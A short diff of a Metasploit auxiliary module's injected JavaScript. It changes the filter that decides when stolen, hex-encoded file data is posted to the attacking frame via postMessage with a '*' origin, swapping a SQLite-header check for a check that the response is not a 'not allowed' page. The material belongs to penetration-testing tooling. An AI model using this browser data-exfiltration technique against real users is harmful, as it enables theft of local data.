@@ -142,7 +142,8 @@ class Metasploit3 < Msf::Auxiliary
                     var c = d.toString(16);
                     return (c.length < 2) ? 0+c : c;
                   }).join(new String);
-                  if (hex.length && hex.substring(0,8)==='53514c69') {
+                  /*ensures there are no 'not allowed' responses that appear to be valid data*/
+                  if (hex.length && hex.indexOf('3c68746d6c3e3c626f64793e6e6f7420616c6c6f7765643c2f626f64793e3c2f68746d6c3e') == '-1') {
                     top.postMessage({data:hex,url:location.href}, '*');
                   }
                   parent.postMessage(1,'*');
